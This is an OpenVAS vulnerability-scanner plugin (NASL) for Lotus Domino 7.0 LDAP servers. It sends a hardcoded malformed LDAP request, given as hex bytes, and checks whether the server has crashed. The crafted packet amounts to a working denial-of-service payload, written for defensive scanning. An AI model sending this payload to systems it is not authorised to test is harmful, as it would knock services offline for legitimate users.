# OpenVAS Vulnerability Test
# $Id: lotus_domino_ldap_dos.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Lotus Domino LDAP Server Denial of Service Vulnerability
#
# Authors:
# Michel Arboi <mikhail@nessus.org>
#
# Copyright:
# Copyright (C) 2005 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote LDAP server is affected by a denial of service
vulnerability. 

Description :

The LDAP server on the remote host appears to have crashed after being
sent a malformed request.  The specific request used is known to crash
the LDAP server in Lotus Domino 7.0.  By leveraging this flaw, an
attacker may be able to deny service to legitimate users.";

tag_solution = "Unknown at this time.";

# This flaw in Lotus Domino 7.0 was discovered by Evgeny Legerov and 
# published on the Dalily Dave mailing list
#
# References:
# From: "Evgeny Legerov" <admin@gleg.net>
# To: dailydave@lists.immunitysec.com
# Date: Sat, 04 Feb 2006 04:33:53 +0300
# Message-ID: <web-77782062@cgp.agava.net>
# Subject: [Dailydave] ProtoVer vs Lotus Domino Server 7.0
#
# Note: this script was *not* tested against a vulnerable server!

if(description)
{
 script_id(20890);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
 script_cve_id("CVE-2005-2712", "CVE-2006-0580");
 script_bugtraq_id(16523);
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_tag(name:"risk_factor", value:"High");

 name = "Lotus Domino LDAP Server Denial of Service Vulnerability";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);
 
 summary = "Sends a malformed request to the remote Lotus Domino LDAP server";
 
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright("This script is Copyright (C) 2005 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service1.nasl", "ldap_detect.nasl", "external_svc_ident.nasl");
 script_require_ports("Services/ldap", 389);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://lists.immunitysec.com/pipermail/dailydave/2006-February/002896.html");
 exit(0);
}

#

port = get_kb_item("Services/ldap");
if ( ! port ) port = 389;

if (! get_port_state(port)) exit(0);

s = open_sock_tcp(port);
if (!s) exit(0);

send(socket: s, data: '\x30\x0c\x02\x01\x01\x60\x07\x02\x00\x03\x04\x00\x80\x00');
res = recv(socket:s, length:1024);
close(s);

if (res == NULL) {
  sleep(1);
  s = open_sock_tcp(port);
  if (s) close(s);
  else security_hole(port);
}

